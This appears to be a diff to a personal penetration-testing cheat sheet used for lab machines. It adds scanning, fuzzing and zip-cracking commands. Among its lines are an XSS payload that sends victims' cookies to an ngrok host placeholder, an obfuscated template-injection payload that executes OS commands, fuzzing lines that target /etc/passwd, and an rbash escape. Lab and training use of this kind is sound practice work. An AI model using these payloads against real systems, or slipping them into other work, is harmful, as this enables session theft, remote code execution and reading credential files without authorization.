@@ -30,6 +30,7 @@ sudo nmap -p- -sV -sC -sS -A -v --min-rate 1000 --max-retries 5 -oN fullportscan
 sudo nmap -p- -sV -sC -sS -A -vvvv -oN portscan.nmap "IP" -Pn
 nmap -sV -sC -A -vvvv -oN portscan.nmap "IP"
 nmap -p- -vvvv 10.129.181.131
+nmap -sC -sV -A -p 25,53,88,135,139,389,445,464,593,636,3268,3269,5985,8530,8531,9389,49667,49669,49670,49672,49884,49903,49924 -vvvvv 10.129.7.171 -oN allports.nmap -Pn
 
 ## Nessus
 sudo service nessusd start
@@ -73,6 +74,10 @@ dirsearch -u "URL" -w "WORDLIST" -e "EXTENTIONS"
 
 ## Finding Domain TXT Records
 dig axfr @"IP" "DOMAIN"
+
+## NodeJS
+- Prototype Pollution
+- Deserialization
 
 ## MYSQL:
 mysql -u "USERNAME" -D "DATABASE NAME" -p
@@ -138,6 +143,10 @@ xfreerdp /u:"USERNAME" /p:'PASSWORD' /v:"IP ADDRESS" +clipboard /dynamic-resolut
 ## FTP Server:
 sudo python3 -m pyftpdlib 21
 
+## FCRACKZIP:
+```bash
+fcrackzip -u -D -p ~/Desktop/rockyou.txt chall.zip
+```
 ## SCP:
 scp remote_username@10.10.0.2:/remote/file.txt /local/directory
 
@@ -147,6 +156,9 @@ wpscan --url "URL" -e u,ap,at,dbe --plugins-detection aggressive
 ## Gobuster:
 gobuster dir -u "URL" -w /usr/share/wordlists/dirb/big.txt -x php,html,txt,bak *Directory Bruteforcing*
 gobuster dns -d "URL" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt *Subdomain Enumeration*
+
+## Dirsearch
+python /opt/dirsearch/dirsearch.py -u http://URL/ -e php,txt,html,asp,aspx -w wordlist.txt -x 302,404 -F -r --deep-recursive --force-recursive -R 5
 
 ## WFUZZ:
 wfuzz -u http://10.10.11.135/image.php?FUZZ=/etc/passwd -w /usr/share/SecLists/Discovery/Web-Content/burp-parameter-names.txt -t 50 --hh 0
@@ -220,10 +232,21 @@ ffuf -c -r -u 'http://10.0.0.12/secret/evil.php?FUZZ=/etc/passwd' -w /usr/share/
 ```
 {{request['application']['\x5f\x5fglobals\x5f\x5f']['\x5f\x5fbuiltins\x5f\x5f']['\x5f\x5f\x69\x6d\x70\x6f\x72\x74\x5f\x5f']('\x6f\x73')['\x70\x6f\x70\x65\x6e']('ls')['read']()}}
 ```
+
+## XSS Cookie Stealing
+```
+<script>new Image().src='NGROK URL/c='+document.cookie</script>
+```
+
 ## SEARCHSPLOIT:
 searchsploit "SERVICE"
 searchsploit -x "EXPLOIT PATH" *To examine the code of the exploit*
 searchsploit -m "EXPLOIT PATH" *Copy the exploit to the working directory*
+
+## Remove lines containing word alert:
+```bash
+^.*(alert).*$
+```
 
 ## Rbash Escape:
 python -c 'import os;os.system("/bin/bash")'
